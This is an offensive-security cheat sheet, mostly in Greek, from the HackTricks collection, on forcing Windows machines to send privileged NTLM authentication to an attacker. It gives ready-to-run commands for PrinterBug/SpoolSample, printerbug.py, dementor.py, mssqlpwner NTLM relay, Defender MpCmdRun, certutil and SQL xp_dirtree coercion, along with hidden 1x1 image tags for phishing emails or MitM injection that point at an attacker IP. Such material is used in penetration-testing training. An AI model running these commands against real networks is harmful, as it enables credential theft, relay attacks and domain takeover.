# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) είναι μια **συλλογή** από **remote authentication triggers** κωδικοποιημένα σε C# χρησιμοποιώντας τον μεταγλωττιστή MIDL για να αποφευχθούν οι εξαρτήσεις από τρίτους.

## Spooler Service Abuse

Εάν η _**Print Spooler**_ υπηρεσία είναι **ενεργοποιημένη,** μπορείτε να χρησιμοποιήσετε κάποιες ήδη γνωστές AD πιστοποιήσεις για να **ζητήσετε** από τον εκτυπωτή του Domain Controller μια **ενημέρωση** για νέες εκτυπώσεις και απλώς να του πείτε να **στείλει την ειδοποίηση σε κάποιο σύστημα**.\
Σημειώστε ότι όταν ο εκτυπωτής στέλνει την ειδοποίηση σε τυχαία συστήματα, χρειάζεται να **αυθεντικοποιηθεί** σε αυτό το **σύστημα**. Επομένως, ένας επιτιθέμενος μπορεί να κάνει την υπηρεσία _**Print Spooler**_ να αυθεντικοποιηθεί σε ένα τυχαίο σύστημα, και η υπηρεσία θα **χρησιμοποιήσει τον λογαριασμό υπολογιστή** σε αυτή την αυθεντικοποίηση.

### Finding Windows Servers on the domain

Χρησιμοποιώντας το PowerShell, αποκτήστε μια λίστα με Windows υπολογιστές. Οι διακομιστές είναι συνήθως προτεραιότητα, οπότε ας επικεντρωθούμε εκεί:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Εύρεση υπηρεσιών Spooler που ακούνε

Χρησιμοποιώντας μια ελαφρώς τροποποιημένη έκδοση του @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), δείτε αν η Υπηρεσία Spooler ακούει:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Μπορείτε επίσης να χρησιμοποιήσετε το rpcdump.py σε Linux και να αναζητήσετε το πρωτόκολλο MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Ζητήστε από την υπηρεσία να πιστοποιηθεί έναντι ενός αυθαίρετου διακομιστή

Μπορείτε να συντάξετε[ **SpoolSample από εδώ**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ή χρησιμοποιήστε [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ή [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) αν είστε σε Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Συνδυασμός με Απεριόριστη Αντιπροσώπευση

Εάν ένας επιτιθέμενος έχει ήδη παραβιάσει έναν υπολογιστή με [Απεριόριστη Αντιπροσώπευση](unconstrained-delegation.md), ο επιτιθέμενος θα μπορούσε **να κάνει τον εκτυπωτή να πιστοποιηθεί σε αυτόν τον υπολογιστή**. Λόγω της απεριόριστης αντιπροσώπευσης, το **TGT** του **λογαριασμού υπολογιστή του εκτυπωτή** θα είναι **αποθηκευμένο** στη **μνήμη** του υπολογιστή με απεριόριστη αντιπροσώπευση. Καθώς ο επιτιθέμενος έχει ήδη παραβιάσει αυτήν την υποδοχή, θα είναι σε θέση να **ανακτήσει αυτό το εισιτήριο** και να το εκμεταλλευτεί ([Pass the Ticket](pass-the-ticket.md)).

## RCP Ανάγκη πιστοποίησης

{{#ref}}
https://github.com/p0dalirius/Coercer
{{#endref}}

## PrivExchange

Η επίθεση `PrivExchange` είναι αποτέλεσμα ενός σφάλματος που βρέθηκε στη **λειτουργία `PushSubscription` του Exchange Server**. Αυτή η λειτουργία επιτρέπει στον διακομιστή Exchange να αναγκάζεται από οποιονδήποτε χρήστη τομέα με γραμματοκιβώτιο να πιστοποιείται σε οποιονδήποτε πελάτη που παρέχει υποδοχή μέσω HTTP.

Από προεπιλογή, η **υπηρεσία Exchange εκτελείται ως SYSTEM** και της έχουν δοθεί υπερβολικά δικαιώματα (συγκεκριμένα, έχει **WriteDacl δικαιώματα στον τομέα πριν από την ενημέρωση Cumulative Update 2019**). Αυτό το σφάλμα μπορεί να εκμεταλλευτεί για να επιτρέψει την **αναμετάδοση πληροφοριών σε LDAP και στη συνέχεια να εξαγάγει τη βάση δεδομένων NTDS του τομέα**. Σε περιπτώσεις όπου η αναμετάδοση σε LDAP δεν είναι δυνατή, αυτό το σφάλμα μπορεί να χρησιμοποιηθεί για να αναμεταδώσει και να πιστοποιηθεί σε άλλες υποδοχές εντός του τομέα. Η επιτυχής εκμετάλλευση αυτής της επίθεσης παρέχει άμεση πρόσβαση στον Διαχειριστή Τομέα με οποιονδήποτε πιστοποιημένο λογαριασμό χρήστη τομέα.

## Μέσα στα Windows

Εάν είστε ήδη μέσα στη μηχανή Windows, μπορείτε να αναγκάσετε τα Windows να συνδεθούν σε έναν διακομιστή χρησιμοποιώντας προνομιακούς λογαριασμούς με:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ή χρησιμοποιήστε αυτήν την άλλη τεχνική: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Είναι δυνατόν να χρησιμοποιήσετε το certutil.exe lolbin (υπογεγραμμένο δυαδικό αρχείο της Microsoft) για να εξαναγκάσετε την αυθεντικοποίηση NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Αν γνωρίζετε τη **διεύθυνση email** του χρήστη που συνδέεται σε μια μηχανή που θέλετε να παραβιάσετε, μπορείτε απλά να του στείλετε ένα **email με μια εικόνα 1x1** όπως
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
και όταν το ανοίξει, θα προσπαθήσει να αυθεντικοποιηθεί.

### MitM

Αν μπορείτε να εκτελέσετε μια επίθεση MitM σε έναν υπολογιστή και να εισάγετε HTML σε μια σελίδα που θα οπτικοποιήσει, θα μπορούσατε να προσπαθήσετε να εισάγετε μια εικόνα όπως η παρακάτω στη σελίδα:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Cracking NTLMv1

Αν μπορείτε να συλλάβετε [NTLMv1 challenges διαβάστε εδώ πώς να τα σπάσετε](../ntlm/index.html#ntlmv1-attack).\
_Θυμηθείτε ότι για να σπάσετε το NTLMv1 πρέπει να ορίσετε την πρόκληση του Responder σε "1122334455667788"_

{{#include ../../banners/hacktricks-training.md}}
